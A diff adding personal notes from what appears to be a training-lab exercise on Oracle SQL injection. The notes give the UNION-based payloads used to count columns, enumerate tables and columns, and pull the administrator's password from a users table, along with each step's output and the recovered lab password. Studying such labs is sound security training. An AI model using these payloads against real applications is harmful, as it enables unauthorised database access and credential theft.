@@ -1,0 +1,36 @@
+SQLi - Listing the database contents on Oracle
+
+End goal:
+- Determine table contain usernames and password
+- Determine the column names in the table
+- Ouput the content of the table
+- Login as administrator
+
+Analysis
+
+1. Determine the number of columns
+' ORDER BY 3-- => internal server error
+
+3 - 1 = 2 cols
+
+2. Determine the data types of columns
+' UNION SELECT 'a', 'a' from dual--
+=> Oracle database
+=> Both columns are type of text
+
+3. Output the list of table in the database
+' UNION SELECT TABLE_NAME, NULL from all_tables--
+
+USERS_HWRIFB
+
+4. Output the columns name of the users table
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_HWRIFB'--
+
+USERNAME_EPYTIP
+PASSWORD_DRQBKP
+
+5. Find password for administrator from the table
+' UNION SELECT USERNAME_EPYTIP, PASSWORD_DRQBKP FROM USERS_HWRIFB WHERE USERNAME_EPYTIP='administrator'--
+
+administrator
+z54gr6psz0b6trs8blmi
